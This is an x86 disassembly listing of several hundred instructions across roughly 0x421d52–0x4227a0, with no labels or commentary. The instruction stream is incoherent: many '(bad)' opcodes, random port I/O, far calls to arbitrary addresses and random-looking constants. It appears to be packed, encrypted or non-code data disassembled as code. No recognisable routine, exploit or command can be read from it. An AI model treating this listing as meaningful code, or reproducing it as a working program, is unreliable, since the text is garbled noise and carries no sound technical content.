  421d52:	mov    eax,0x712999b3
  421d57:	fldcw  WORD PTR gs:[ebx-0x3da15495]
  421d5e:	test   DWORD PTR [esi+0x216e3a46],ecx
  421d64:	retf   
  421d65:	lahf   
  421d66:	pop    edx
  421d67:	xor    dl,bh
  421d69:	pop    edx
  421d6a:	jbe    0x421d46
  421d6c:	xchg   ecx,eax
  421d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d6e:	mov    edi,0x3106a9ef
  421d73:	cmp    al,BYTE PTR [ecx-0x55]
  421d76:	or     DWORD PTR [eax-0x47f52dd],esp
  421d7c:	mov    ebp,0x67c03a5a
  421d81:	dec    ecx
  421d82:	ins    DWORD PTR es:[edi],dx
  421d83:	xor    esp,DWORD PTR [ecx-0x66e4491a]
  421d89:	add    al,0xe5
  421d8b:	test   BYTE PTR ds:0x8087e4dd,ch
  421d91:	xchg   ebp,eax
  421d92:	jb     0x421d54
  421d94:	push   eax
  421d95:	shr    BYTE PTR [edx-0x79],cl
  421d98:	rcr    DWORD PTR [edx],1
  421d9a:	push   es
  421d9b:	jbe    0x421d22
  421d9d:	arpl   WORD PTR [ecx],sp
  421d9f:	sub    al,0xce
  421da1:	mov    ebx,0x561a734a
  421da6:	mov    ebx,0x43c3b22e
  421dab:	(bad)  [ebx-0x30]
  421dae:	clc    
  421daf:	dec    esi
  421db0:	and    dl,BYTE PTR [ecx]
  421db2:	push   eax
  421db3:	sub    al,0x94
	...
  421e15:	add    bh,cl
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    BYTE PTR [edi+0x11265b],dl
  421e27:	push   0x1070001
  421e2c:	add    BYTE PTR [eax],al
  421e2e:	xlat   BYTE PTR fs:[ebx]
  421e30:	mov    ebp,DWORD PTR [esi+0x2a]
  421e33:	sahf   
  421e34:	xor    edx,ebx
  421e36:	add    BYTE PTR [edx+0x70],al
  421e39:	xor    esp,eax
  421e3b:	les    esi,FWORD PTR [edi+ebx*1-0x50]
  421e3f:	lea    ebx,[ebx]
  421e41:	pop    edx
  421e42:	lock mov eax,ds:0x7c104fa1
  421e48:	sub    ah,cl
  421e4a:	inc    eax
  421e4b:	push   ebx
  421e4c:	cmp    al,0x6a
  421e4e:	inc    esp
  421e4f:	add    ebp,DWORD PTR [ebp+0x7c]
  421e52:	bound  ebx,QWORD PTR [ebx+0x6bbdf783]
  421e58:	sub    dl,BYTE PTR [edx+eiz*2-0x7aa34cf4]
  421e5f:	aad    0x50
  421e61:	push   ebp
  421e62:	sub    ebx,esp
  421e64:	inc    eax
  421e65:	adc    eax,DWORD PTR [ebx]
  421e67:	call   0x254003c0
  421e6c:	jb     0x421e2f
  421e6e:	xor    eax,0xdb8db4c3
  421e73:	lods   eax,DWORD PTR ds:[esi]
  421e74:	out    0x27,eax
  421e76:	dec    ebx
  421e77:	cwde   
  421e78:	push   ds
  421e79:	push   ebp
  421e7a:	imul   eax,ebx,0xffffff81
  421e7d:	stos   BYTE PTR es:[edi],al
  421e7e:	nop
  421e7f:	mov    esi,DWORD PTR [edi+ebx*8]
  421e82:	push   esi
  421e83:	mov    cl,0xa5
  421e85:	fwait
  421e86:	in     eax,0x46
  421e88:	sbb    edi,DWORD PTR [eax-0x5d]
  421e8b:	and    bh,BYTE PTR [ebx+0x6e]
  421e8e:	fs mov ?,edx
  421e91:	lock push cs
  421e93:	sbb    bl,BYTE PTR [ecx-0x4651696f]
  421e99:	jae    0x421eea
  421e9b:	jns    0x421ec0
  421e9d:	shl    DWORD PTR ds:0x367e7203,0xee
  421ea4:	loope  0x421e49
  421ea6:	xor    ah,BYTE PTR [ebx-0x3]
  421ea9:	jle    0x421edf
  421eab:	leave  
  421eac:	icebp  
  421ead:	push   eax
  421eae:	mov    cl,dh
  421eb0:	into   
  421eb1:	shr    BYTE PTR [eax],0xeb
  421eb4:	mov    WORD PTR [eax],fs
  421eb6:	fdiv   QWORD PTR [edi+edi*8-0x37d14f6c]
  421ebd:	jecxz  0x421e4a
  421ebf:	fdiv   DWORD PTR [ebp+0x7d]
  421ec2:	popa   
  421ec3:	lea    edx,[ebp+0x7d5ba528]
  421ec9:	inc    esi
  421eca:	push   ecx
  421ecb:	dec    edx
  421ecc:	rcr    DWORD PTR [edx+0x473279e],cl
  421ed2:	push   cs
  421ed3:	cmp    al,0xd2
  421ed5:	or     BYTE PTR [esp+esi*8-0x1de0fcc7],bh
  421edc:	ror    DWORD PTR [ecx-0x6cbf1697],0x7d
  421ee3:	popf   
  421ee4:	call   0x10b0fc41
  421ee9:	or     al,0x2a
  421eeb:	mov    ds:0x46fa7949,al
  421ef0:	enter  0xa4e8,0x96
  421ef4:	jl     0x421f3b
  421ef6:	call   0x853a:0xa262e0ee
  421efd:	add    eax,0x62935067
  421f02:	xor    al,al
  421f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f05:	ss clc 
  421f07:	rcr    DWORD PTR [eax],1
  421f09:	add    dl,bl
  421f0b:	xor    bh,0x34
  421f0e:	jle    0x421f8b
  421f10:	sbb    al,0xc7
  421f12:	ds or  dh,al
  421f15:	jp     0x421ea4
  421f17:	test   BYTE PTR [ebx],dh
  421f19:	inc    eax
  421f1a:	(bad)  
  421f1c:	shl    BYTE PTR [edx-0x5e],0xe8
  421f20:	inc    edi
  421f21:	push   ds
  421f22:	std    
  421f23:	iret   
  421f24:	push   ebx
  421f25:	push   ebp
  421f26:	mov    ebp,0x554f1889
  421f2b:	inc    ebx
  421f2c:	add    al,0xd7
  421f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f2f:	ret    0xc980
  421f32:	(bad)  
  421f33:	out    0x89,al
	...
  421f95:	add    BYTE PTR [ebx+0x6],ch
  421f98:	(bad)  
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0x5b8daf78
  421fa4:	into   
  421fa5:	mov    BYTE PTR [edi],al
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [ebp+eax*4+0x51],cl
  421fb1:	push   esp
  421fb2:	pusha  
  421fb3:	xor    DWORD PTR [eax],ebx
  421fb5:	in     eax,dx
  421fb6:	retf   0xac90
  421fb9:	and    edx,edi
  421fbb:	int    0xfc
  421fbd:	push   edx
  421fbe:	cmc    
  421fbf:	jmp    FWORD PTR [eax+0x72]
  421fc2:	or     BYTE PTR [edi],bh
  421fc4:	xchg   ecx,eax
  421fc5:	adc    BYTE PTR [ecx],ah
  421fc7:	aad    0x15
  421fc9:	(bad)  
  421fca:	(bad)  
  421fcb:	out    0x17,al
  421fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fce:	lahf   
  421fcf:	bnd jae 0x421fdc
  421fd2:	sbb    eax,0x241262e7
  421fd7:	xchg   ebx,eax
  421fd8:	add    al,0x78
  421fda:	ror    ah,0x37
  421fdd:	mov    al,0xd9
  421fdf:	dec    esp
  421fe0:	push   eax
  421fe1:	cmc    
  421fe2:	sub    ecx,ebp
  421fe4:	int3   
  421fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fe6:	cmp    DWORD PTR [eax],ebp
  421fe8:	pop    edi
  421fe9:	sbb    ecx,DWORD PTR [ebx+edx*1]
  421fec:	out    dx,al
  421fed:	call   0x15b2ac1b
  421ff2:	loope  0x421fe2
  421ff4:	and    DWORD PTR [esi-0x39],ecx
  421ff7:	jmp    0x9c39:0xd2efb25e
  421ffe:	mov    ch,0xe2
  422000:	sahf   
  422001:	dec    esi
  422002:	cmp    DWORD PTR [edi],0xd403696d
  422008:	adc    BYTE PTR [esi],bh
  42200a:	arpl   WORD PTR [ebx+0x1cfbeeda],sp
  422010:	mov    dh,0x60
  422012:	pop    es
  422013:	xchg   edi,eax
  422014:	push   edi
  422015:	add    BYTE PTR [ebx+0x6bc9ff90],0x3d
  42201c:	loop   0x421ff5
  42201e:	pop    ebp
  42201f:	xchg   esi,eax
  422020:	xlat   BYTE PTR ds:[ebx]
  422021:	das    
  422022:	sub    bl,BYTE PTR ds:0xf70b9a93
  422028:	mov    edx,0xb0c4d702
  42202d:	jle    0x421fe5
  42202f:	jp     0x4220a8
  422031:	stos   DWORD PTR es:[edi],eax
  422032:	ret    0xa5ab
  422035:	xor    eax,DWORD PTR [eax+edx*8]
  422038:	xlat   BYTE PTR ds:[ebx]
  422039:	push   esi
  42203a:	jle    0x422005
  42203c:	xchg   ecx,eax
  42203d:	xor    eax,0x73185851
  422042:	dec    edx
  422043:	inc    BYTE PTR [ebx]
  422045:	add    BYTE PTR [edx+0x2b3b0ef0],dh
  42204b:	sbb    eax,0x3ab1d2d9
  422050:	jmp    0x5d670937
  422055:	mov    esp,0xaf1c9022
  42205a:	popf   
  42205b:	stos   DWORD PTR es:[edi],eax
  42205c:	test   bl,dh
  42205e:	ins    BYTE PTR es:[edi],dx
  42205f:	xor    BYTE PTR [ebx],ch
  422061:	int    0x8f
  422063:	sub    DWORD PTR [eax],edi
  422065:	adc    al,0x7c
  422067:	pop    eax
  422068:	sahf   
  422069:	mov    dh,0xd6
  42206b:	jae    0x421ffc
  42206d:	cmp    bh,BYTE PTR [edi]
  42206f:	add    ebp,DWORD PTR [ecx+0x1519e768]
  422075:	xchg   ecx,eax
  422076:	icebp  
  422077:	not    DWORD PTR [ecx]
  422079:	mov    ds,WORD PTR [ecx+0x795a472a]
  42207f:	adc    BYTE PTR [ebx-0x71],bl
  422082:	shr    BYTE PTR [ebx+ebx*1],1
  422085:	fistp  DWORD PTR [edi-0x5e]
  422088:	mov    bh,0xc1
  42208a:	push   edx
  42208b:	adc    dh,0x9b
  42208e:	xor    al,0x8c
  422090:	mov    al,0x92
  422092:	in     al,0xae
  422094:	cmc    
  422095:	xor    BYTE PTR [edx+eiz*4],0x64
  422099:	or     ecx,DWORD PTR [esi]
  42209b:	and    al,0xd0
  42209d:	push   eax
  42209e:	mov    al,0xc3
  4220a0:	imul   ebp,DWORD PTR [esi],0x1fb8f5cd
  4220a6:	or     DWORD PTR [eax-0x4c671fba],esi
  4220ac:	push   ebx
  4220ad:	inc    ebp
  4220ae:	cmp    eax,0x5de2f1a8
  4220b3:	outs   dx,DWORD PTR ds:[esi]
  4220b4:	sldt   WORD PTR [eax]
	...
  422113:	add    BYTE PTR [eax],al
  422115:	add    BYTE PTR [esi-0x284ae],ah
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0x7d5c
  422123:	or     BYTE PTR [esi],ch
  422125:	push   ecx
  422126:	push   cs
  422127:	push   0x1
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    BYTE PTR [eax-0x338a0162],bh
  422133:	mul    edi
  422135:	ds jg  0x422153
  422138:	(bad)  
  422139:	in     al,0xfe
  42213b:	inc    ebp
  42213c:	jno    0x4221a9
  42213e:	(bad)  
  422140:	and    esp,DWORD PTR [ebx]
  422142:	cld    
  422143:	mov    edx,0x9e14fb38
  422148:	test   eax,0x8fbeb3b6
  42214d:	sub    esp,DWORD PTR [edx-0x6f]
  422150:	mov    edi,0xd47852e4
  422155:	add    al,0x7f
  422157:	dec    edi
  422158:	xor    dh,BYTE PTR [edx]
  42215a:	or     eax,0xc8dbd356
  42215f:	mov    esi,0xfaf4a3bc
  422164:	pop    eax
  422165:	repnz inc ecx
  422167:	call   0xab526967
  42216c:	ret    
  42216d:	outs   dx,DWORD PTR ds:[esi]
  42216e:	out    dx,al
  42216f:	sub    al,0x56
  422171:	sub    DWORD PTR [edi],ebp
  422173:	xchg   ebx,eax
  422174:	fst    DWORD PTR [esi-0x11]
  422177:	in     al,0xbe
  422179:	adc    al,0x8a
  42217b:	jecxz  0x4221b4
  42217d:	fucomip st,st(3)
  42217f:	hlt    
  422180:	sti    
  422181:	rcl    DWORD PTR [esi],cl
  422183:	xlat   BYTE PTR ds:[ebx]
  422184:	jns    0x422145
  422186:	add    BYTE PTR [esi],dl
  422188:	fstp   TBYTE PTR [ebp+0x5310bf2a]
  42218e:	cld    
  42218f:	or     esp,DWORD PTR [ecx+eax*1-0x17]
  422193:	cwde   
  422194:	shr    BYTE PTR [edx+edx*4+0x481fc6b6],cl
  42219b:	sub    al,0xf5
  42219d:	pop    edi
  42219e:	in     al,dx
  42219f:	mul    BYTE PTR [ebp+0xf]
  4221a2:	or     eax,0xfdef7fec
  4221a7:	adc    eax,0x952e6c8a
  4221ac:	dec    edi
  4221ad:	scas   eax,DWORD PTR es:[edi]
  4221ae:	mov    ?,edx
  4221b0:	test   edi,ebx
  4221b2:	repnz mov ah,0x7f
  4221b5:	mov    esp,0x26ab08cd
  4221ba:	push   esi
  4221bb:	mov    eax,0x6f949c3d
  4221c0:	xchg   edx,eax
  4221c1:	stc    
  4221c2:	das    
  4221c3:	jb     0x4221a8
  4221c5:	inc    edx
  4221c6:	aad    0xae
  4221c8:	mov    ebx,0xa0c34e71
  4221cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221ce:	jecxz  0x422180
  4221d0:	and    cl,BYTE PTR [ebp+ebp*4-0x78]
  4221d4:	inc    edx
  4221d5:	pop    edi
  4221d6:	in     al,dx
  4221d7:	retf   
  4221d8:	xchg   ecx,eax
  4221d9:	mov    ds:0xf55191c8,al
  4221de:	pop    esp
  4221df:	loopne 0x42222e
  4221e1:	jne    0x42221a
  4221e3:	cs daa 
  4221e5:	mov    WORD PTR [eax-0x5e4a1083],gs
  4221eb:	clc    
  4221ec:	fwait
  4221ed:	mov    ebx,0x30dd9212
  4221f2:	out    0x41,al
  4221f4:	jo     0x4221ab
  4221f6:	scas   eax,DWORD PTR es:[edi]
  4221f7:	aam    0xc7
  4221f9:	sbb    dh,BYTE PTR [eax+0x0]
  4221fc:	test   al,0xc9
  4221fe:	fwait
  4221ff:	lds    edx,FWORD PTR [ecx+0x5d]
  422202:	clc    
  422203:	fwait
  422204:	rol    DWORD PTR [eax+ebp*8+0x14b63d8],0x9d
  42220c:	fwait
  42220d:	sbb    esi,DWORD PTR [ebx-0x78e2e093]
  422213:	xchg   ebp,eax
  422214:	jo     0x422243
  422216:	popf   
  422217:	aaa    
  422218:	cmovl  edi,DWORD PTR [ebp-0x48b4b51b]
  42221f:	pop    ecx
  422220:	fwait
  422221:	xor    eax,0x67ae4631
  422226:	jnp    0x42227e
  422228:	cmp    dl,bl
  42222a:	adc    ebx,DWORD PTR [edx-0x290415c8]
  422230:	inc    esp
  422231:	push   edx
  422232:	mov    edi,?
  422234:	in     eax,dx
	...
  422295:	add    BYTE PTR [edi-0x10085213],cl
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    ebx,DWORD PTR [edi+0x1594e432]
  4222a7:	imul   eax,DWORD PTR [ecx],0x0
  4222aa:	pop    es
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    ch,dh
  4222af:	xchg   edi,eax
  4222b0:	sbb    dh,bh
  4222b2:	sbb    edi,DWORD PTR [esi+edi*4+0x3f082ab0]
  4222b9:	push   0xfcb69021
  4222be:	inc    esi
  4222bf:	pop    ss
  4222c0:	push   edx
  4222c1:	push   ecx
  4222c2:	cmp    eax,0x5eaaf95d
  4222c7:	cs inc edi
  4222c9:	xchg   ebp,eax
  4222ca:	test   al,0x10
  4222cc:	cmp    ch,dl
  4222ce:	loope  0x4222b2
  4222d0:	xchg   esi,eax
  4222d1:	and    BYTE PTR [eax-0x47f2e3c0],bl
  4222d7:	jno    0x4222a9
  4222d9:	inc    edi
  4222da:	jmp    0x422331
  4222dc:	popf   
  4222dd:	mov    bh,0x95
  4222df:	jns    0x4222c6
  4222e1:	addr16 pop eax
  4222e3:	push   esi
  4222e4:	inc    edx
  4222e5:	pop    ds
  4222e6:	ret    
  4222e7:	call   0x242d:0x101d9fac
  4222ee:	daa    
  4222ef:	jno    0x42231c
  4222f1:	ret    0xa84
  4222f4:	dec    ecx
  4222f5:	retf   0xc5d6
  4222f8:	inc    edx
  4222f9:	adc    BYTE PTR [ebx+0x388ca575],dl
  4222ff:	jecxz  0x4222bf
  422301:	pop    edi
  422302:	fstp   DWORD PTR ds:[edx]
  422305:	test   BYTE PTR [ebx+0x5bffead1],0x94
  42230c:	cmp    BYTE PTR [ecx+0x3],dl
  42230f:	enter  0x68fb,0xb3
  422313:	push   0xaf7ca1f7
  422318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422319:	jmp    0x44c9d22e
  42231e:	mov    esp,0xc1c4367d
  422323:	sub    dl,cl
  422325:	sub    al,0x79
  422327:	mov    bh,0xe6
  422329:	xchg   ebx,eax
  42232a:	adc    DWORD PTR [ecx],edx
  42232c:	cmp    BYTE PTR [ecx],ah
  42232e:	push   ebp
  42232f:	jge    0x4222fa
  422331:	inc    ebp
  422332:	xchg   esp,eax
  422333:	dec    ecx
  422334:	out    0xe5,al
  422336:	push   ebp
  422337:	pop    edi
  422338:	fs push eax
  42233a:	dec    ebp
  42233b:	push   0x6112ae9d
  422340:	(bad)  
  422341:	xor    bl,BYTE PTR ds:0x8ffcce3e
  422347:	mov    al,0xd8
  422349:	lock in al,dx
  42234b:	mov    dl,0x6d
  42234d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42234e:	daa    
  42234f:	outs   dx,DWORD PTR ds:[esi]
  422350:	lahf   
  422351:	push   es
  422352:	iret   
  422353:	pop    ss
  422354:	pop    ebx
  422355:	jmp    0xf1e34b4a
  42235a:	mov    ebp,0xac84f828
  42235f:	adc    edx,esi
  422361:	push   ds
  422362:	jp     0x4223c4
  422364:	inc    ebx
  422365:	and    esi,DWORD PTR [edx]
  422367:	hlt    
  422368:	cmp    al,0x96
  42236a:	test   eax,0xd2d758b9
  42236f:	scas   eax,DWORD PTR es:[edi]
  422370:	outs   dx,BYTE PTR ds:[esi]
  422371:	dec    ecx
  422372:	inc    esp
  422373:	push   esp
  422374:	and    al,0x9d
  422376:	xor    BYTE PTR [eax-0x2ebed9c6],ah
  42237c:	adc    edi,ebp
  42237e:	nop    DWORD PTR [edx]
  422381:	rol    DWORD PTR [ecx-0x2d982b43],cl
  422387:	das    
  422388:	push   esp
  422389:	mov    ch,0x35
  42238b:	je     0x42230e
  42238d:	into   
  42238e:	jmp    0xb1348190
  422393:	inc    edi
  422394:	mov    eax,0x5f75c1fd
  422399:	out    0x5b,eax
  42239b:	mov    cl,0xa3
  42239d:	fnsave [ecx]
  42239f:	jecxz  0x4223d6
  4223a1:	out    0x6b,al
  4223a3:	inc    esp
  4223a4:	lods   al,BYTE PTR ds:[esi]
  4223a5:	or     BYTE PTR [edi-0x6],al
  4223a8:	xor    dl,BYTE PTR [esi+0x7300ac9c]
  4223ae:	loope  0x42241f
  4223b0:	test   eax,0xa1c46ae9
	...
  422415:	add    BYTE PTR [edx-0x7e],dl
  422418:	cs imul edi,esi,0x88bb57ed
  42241f:	adc    eax,0xa43765b6
  422424:	les    ecx,FWORD PTR [esi+0x16c1c]
  42242a:	pop    es
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [edi-0x21],dl
  422430:	jno    0x422450
  422432:	mov    edi,esi
  422434:	cs or  al,0x67
  422437:	jp     0x42240a
  422439:	out    0xe7,al
  42243b:	cld    
  42243c:	es xbegin 0xc0697fbe
  422443:	mov    WORD PTR [eax-0x1a],ds
  422446:	lods   al,BYTE PTR ds:[esi]
  422447:	cli    
  422448:	xchg   esp,eax
  422449:	xlat   BYTE PTR ds:[ebx]
  42244a:	xchg   edi,eax
  42244b:	in     eax,dx
  42244c:	mov    ch,0x1d
  42244e:	sar    DWORD PTR [ecx-0xc],cl
  422451:	pop    edx
  422452:	bound  ebp,QWORD PTR [eax+0x77]
  422455:	sbb    al,al
  422457:	dec    esi
  422458:	inc    eax
  422459:	clc    
  42245a:	out    dx,al
  42245b:	pop    ax
  42245d:	inc    esp
  42245e:	dec    esi
  42245f:	sub    DWORD PTR [ecx+0x65],esp
  422462:	xor    BYTE PTR [esi-0x2b],0x60
  422466:	stos   DWORD PTR es:[edi],eax
  422467:	loope  0x4224c4
  422469:	lock pop eax
  42246b:	push   es
  42246c:	clc    
  42246d:	inc    esi
  42246e:	ret    
  42246f:	hlt    
  422470:	push   esp
  422471:	shl    DWORD PTR [ebx],0xa5
  422474:	ret    
  422475:	mov    edi,0x53abb210
  42247a:	es int 0x62
  42247d:	adc    BYTE PTR [eax-0x77d0629e],cl
  422483:	adc    ebp,eax
  422485:	ror    esi,0x27
  422488:	push   esp
  422489:	(bad)  
  42248b:	pusha  
  42248c:	xchg   edi,ebp
  42248e:	add    ebx,0xffffffb7
  422491:	pop    ebp
  422492:	mov    esi,0x3b6fea4c
  422497:	daa    
  422498:	(bad)  
  42249a:	(bad)  
  42249b:	and    DWORD PTR [edi+0x69097fc2],ebp
  4224a1:	jb     0x4224f4
  4224a3:	mov    WORD PTR ds:0x4f971a0b,?
  4224a9:	lea    ebp,[edx+0x10]
  4224ac:	fstp   TBYTE PTR [esp+ecx*2+0x4c]
  4224b0:	mov    eax,0x6855478c
  4224b5:	ins    DWORD PTR es:[edi],dx
  4224b6:	dec    ebp
  4224b7:	sahf   
  4224b8:	inc    ebp
  4224b9:	jmp    0x42252c
  4224bb:	sbb    al,0x38
  4224bd:	mov    eax,0xa6178bdc
  4224c2:	push   0xc0f32589
  4224c7:	mov    DWORD PTR [ebp+0xf],eax
  4224ca:	fs sub al,0x8a
  4224cd:	push   ebx
  4224ce:	inc    edi
  4224cf:	jp     0x42252f
  4224d1:	fbstp  TBYTE PTR [edi+edx*1]
  4224d4:	frstpm(287 only) 
  4224d6:	sub    bl,ah
  4224d8:	jmp    0x15cdf559
  4224dd:	pop    esp
  4224de:	test   eax,0x8a4c3920
  4224e3:	pop    eax
  4224e4:	daa    
  4224e5:	sahf   
  4224e6:	pop    es
  4224e7:	and    al,BYTE PTR [ebx]
  4224e9:	pusha  
  4224ea:	pop    eax
  4224eb:	mov    fs,WORD PTR [edi+0x592cb061]
  4224f1:	xchg   BYTE PTR [ecx],dl
  4224f3:	push   edi
  4224f4:	fist   WORD PTR [ecx+edi*8+0x77604b2a]
  4224fb:	dec    eax
  4224fc:	pusha  
  4224fd:	inc    ecx
  4224fe:	push   esi
  4224ff:	push   ebx
  422500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422501:	push   0xffffffa1
  422503:	xor    al,0xef
  422505:	adc    al,BYTE PTR [ecx-0x38]
  422508:	sub    ch,BYTE PTR [eax-0x1f]
  42250b:	xchg   DWORD PTR [ecx],ecx
  42250d:	scas   al,BYTE PTR es:[edi]
  42250e:	iret   
  42250f:	cdq    
  422510:	(bad)  
  422511:	mov    WORD PTR [edi-0x359a6a91],?
  422517:	lods   eax,DWORD PTR ds:[esi]
  422518:	lods   al,BYTE PTR ds:[esi]
  422519:	inc    edi
  42251a:	mov    ecx,0xd4766a2e
  42251f:	push   edx
  422520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422521:	aaa    
  422522:	mov    BYTE PTR [edi+0x36],cl
  422525:	outs   dx,DWORD PTR ds:[esi]
  422526:	std    
  422527:	inc    esp
  422528:	sbb    DWORD PTR [edx+0x24],0x76
  42252c:	jl     0x422563
  42252e:	aas    
  42252f:	je     0x422573
  422531:	inc    ebp
  422532:	cdq    
  422533:	call   0x42259a
	...
  422594:	add    BYTE PTR [eax],al
  422596:	call   0xfa77:0xbf778fae
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fdivr  DWORD PTR [edx+0x41]
  4225a4:	shl    BYTE PTR [edx+0x23],0x6d
  4225a8:	add    DWORD PTR [eax],eax
  4225aa:	pop    es
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [ebp+0x24479b8],bl
  4225b3:	fdivr  QWORD PTR ds:0xe5d8b44e
  4225b9:	xchg   edx,eax
  4225ba:	sub    dl,BYTE PTR [edx]
  4225bc:	or     eax,0xd8ae9abe
  4225c1:	cmp    dl,BYTE PTR [edx-0x2f3b9ec2]
  4225c7:	jp     0x422561
  4225c9:	xor    esi,DWORD PTR [esi]
  4225cb:	out    dx,eax
  4225cc:	adc    bl,cl
  4225ce:	mov    al,ds:0xe495d3b3
  4225d3:	arpl   ax,bx
  4225d5:	sub    ecx,eax
  4225d7:	gs and eax,0x70e46d56
  4225dd:	adc    DWORD PTR [esp+ecx*1+0x16],ecx
  4225e1:	jg     0x422606
  4225e3:	xor    dh,dl
  4225e5:	mov    WORD PTR [ecx],fs
  4225e7:	retf   0x21ff
  4225ea:	or     ax,0xff2b
  4225ee:	call   0x8003:0xc7570ece
  4225f5:	cmp    ch,BYTE PTR [ebp-0x582893d6]
  4225fb:	imul   esp,DWORD PTR [edi+0x2fab60d3],0xffffffac
  422602:	lods   al,BYTE PTR ds:[esi]
  422603:	loope  0x422659
  422605:	dec    ecx
  422606:	mov    edx,0x67d6c52a
  42260b:	mov    edx,0x117d1b92
  422610:	out    dx,eax
  422611:	xchg   DWORD PTR [eax],esi
  422613:	cmp    DWORD PTR [ecx+eax*8-0x3de9b717],ebx
  42261a:	stos   BYTE PTR es:[edi],al
  42261b:	nop
  42261c:	js     0x4225bc
  42261e:	adc    al,0x43
  422620:	mov    ah,dh
  422622:	imul   eax,DWORD PTR ds:0xe05ba939,0xfd823c70
  42262c:	inc    edx
  42262d:	dec    esi
  42262e:	xchg   ebp,eax
  42262f:	sbb    BYTE PTR [edi+esi*2],0x38
  422633:	or     eax,0x79bd7a99
  422638:	mov    eax,0xd4bacc55
  42263d:	cdq    
  42263e:	test   eax,0x4d240fb6
  422643:	sbb    dh,BYTE PTR [ecx+edi*8+0x18]
  422647:	sub    DWORD PTR [edi],edi
  422649:	mov    cl,0xc1
  42264b:	add    BYTE PTR [edx],dl
  42264d:	mov    gs,WORD PTR [edx-0x55]
  422650:	arpl   WORD PTR [eax],bx
  422652:	mov    edi,0x716a47b
  422657:	mov    ds:0x6d590771,eax
  42265c:	inc    edx
  42265d:	sbb    al,0x6e
  42265f:	cld    
  422660:	fmul   DWORD PTR [edi-0x490821b6]
  422666:	ins    DWORD PTR es:[edi],dx
  422667:	inc    edx
  422668:	clc    
  422669:	push   ss
  42266a:	jae    0x42268b
  42266c:	mov    ?,WORD PTR [eax]
  42266e:	inc    ebx
  42266f:	repz aam 0x43
  422672:	pop    es
  422673:	jg     0x42265b
  422675:	shr    BYTE PTR [edi-0xdcc0378],cl
  42267b:	and    eax,0xa672cc17
  422680:	jbe    0x4226a9
  422682:	inc    edx
  422683:	out    dx,eax
  422684:	js     0x42262d
  422686:	repnz shr esp,0x2
  42268a:	jmp    0xcd886822
  42268f:	dec    ebx
  422690:	pop    ebx
  422691:	pop    edx
  422692:	sub    cl,0x7
  422695:	ins    DWORD PTR es:[edi],dx
  422696:	adc    al,bh
  422698:	mov    cl,BYTE PTR [ebx+0x30]
  42269b:	adc    cl,cl
  42269d:	lods   eax,DWORD PTR ds:[esi]
  42269e:	ret    0xb12
  4226a1:	xor    eax,0x409f87e2
  4226a6:	gs gs scas al,BYTE PTR es:[edi]
  4226a9:	inc    ebx
  4226aa:	ss scas al,BYTE PTR es:[edi]
  4226ac:	mov    edi,0xa6a37eb6
  4226b1:	out    dx,eax
  4226b2:	dec    esp
  4226b3:	mov    bl,0x8f
	...
  422715:	add    BYTE PTR [edi],ah
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	inc    esp
  422723:	cmp    esp,DWORD PTR [ebp+0x16e2aa4]
  422729:	add    BYTE PTR [edi],al
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR [ecx-0x30],dh
  422730:	bound  esi,QWORD PTR [eax-0x6f6e0121]
  422736:	sub    eax,0x1d7c378
  42273b:	sahf   
  42273c:	cmp    al,0xd8
  42273e:	aad    0xa8
  422740:	or     dl,BYTE PTR [ebx+eax*4]
  422743:	mov    WORD PTR [ecx],cs
  422745:	ret    
  422746:	inc    ecx
  422747:	cmp    ecx,DWORD PTR [esi-0x2fc7e8a0]
  42274d:	mov    ebp,0x6a58a9ae
  422752:	hlt    
  422753:	aam    0x2b
  422755:	stos   BYTE PTR es:[edi],al
  422756:	imul   edx,DWORD PTR es:[eax],0xe59c37e2
  42275d:	out    0x0,al
  42275f:	inc    ebp
  422760:	mov    WORD PTR ds:0xf333ab29,gs
  422766:	mov    al,0xe0
  422768:	pop    gs
  42276a:	push   ds
  42276b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42276c:	add    BYTE PTR [esi],bl
  42276e:	addr16 add ecx,esp
  422771:	(bad)  
  422772:	xor    bh,ch
  422774:	or     ecx,DWORD PTR [edi]
  422776:	dec    edx
  422777:	push   ebx
  422778:	aad    0x8c
  42277a:	jp     0x422795
  42277c:	or     al,0x51
  42277e:	xlat   BYTE PTR ds:[ebx]
  42277f:	inc    esp
  422780:	repz xchg edi,eax
  422782:	dec    esi
  422783:	xor    al,0xf6
  422785:	in     eax,0x54
  422787:	mov    ecx,0x32e15fa7
  42278c:	icebp  
  42278d:	add    DWORD PTR [edx-0x21efc24a],edi
  422793:	sub    DWORD PTR [ebx],eax
  422795:	jl     0xa2deab54
  42279b:	jecxz  0x4227f4
  42279d:	jbe    0x4227a2
  42279f:	leave  
  4227a0:	pop    ds
